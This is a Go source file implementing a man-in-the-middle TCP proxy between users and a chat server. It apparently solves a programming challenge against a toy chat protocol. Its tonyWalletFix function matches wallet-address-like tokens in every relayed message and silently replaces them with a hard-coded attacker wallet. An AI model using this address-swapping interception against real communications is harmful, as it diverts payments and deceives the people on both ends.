package mitm

import (
	"context"
	"errors"
	"io"
	"log"
	"net"
	"regexp"
	"strings"
)

const (
	tonyWallet    string = "7YWHMfk9JZe0LM0g1ZauHuiSxhI"
	walletPattern string = `(^|[\s])(7[a-zA-Z0-9]{25,34})($|[\s\n])`
)

var re *regexp.Regexp = regexp.MustCompile(walletPattern)

func tonyWalletFix(text string) string {
	if !re.MatchString(text) {
		return text
	}
	sSplit := strings.Split(text, " ")
	builder := strings.Builder{}
	for i, s := range sSplit {
		if i != 0 {
			builder.WriteRune(' ')
		}
		if !re.MatchString(s) {
			builder.WriteString(s)
			continue
		}
		builder.WriteString(tonyWallet)
	}
	builder.WriteRune('\n')
	return builder.String()
}

func RunMitmProxy(ctx context.Context, conn net.Conn, chatAddr string) {
	userCtx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer conn.Close()
	defer log.Printf("Mitm proxy for %s closed", conn.RemoteAddr().String())

	userConn := NewMitmConn(conn, conn.RemoteAddr().String())
	userUp := make(chan string, EventChannelSize)

	chatConn, err := createChatServerConn(chatAddr)
	if err != nil {
		log.Printf("Failed to create chat connection for %s: %v", userConn.Address, err)
		return
	}
	chatUp := make(chan string, EventChannelSize)

	fail := make(chan ConnError, EventChannelSize)

	userConn.Run(userCtx, userUp, fail)
	chatConn.Run(userCtx, chatUp, fail)

	log.Printf("Mitm proxy for %s<->%s started", userConn.Address, chatConn.Address)

	for {
		select {
		case <-ctx.Done():
			return
		case userMessage := <-userUp:
			chatConn.QueueSend(tonyWalletFix(userMessage))
		case chatMessage := <-chatUp:
			userConn.QueueSend(tonyWalletFix(chatMessage))
		case err := <-fail:
			if errors.Is(err.Err, net.ErrClosed) || errors.Is(err.Err, io.EOF) {
				return
			}
			log.Printf(
				"Err on conn for pair %s<->%s => %v",
				userConn.Address,
				chatConn.Address,
				err,
			)
			return
		}
	}
}

func createChatServerConn(chatAddr string) (MitmConn, error) {
	srvTCPAddr, err := net.ResolveTCPAddr("tcp", chatAddr)
	if err != nil {
		return MitmConn{}, err
	}

	conn, err := net.DialTCP("tcp", nil, srvTCPAddr)
	if err != nil {
		return MitmConn{}, err
	}

	return NewMitmConn(conn, conn.LocalAddr().String()), nil
}
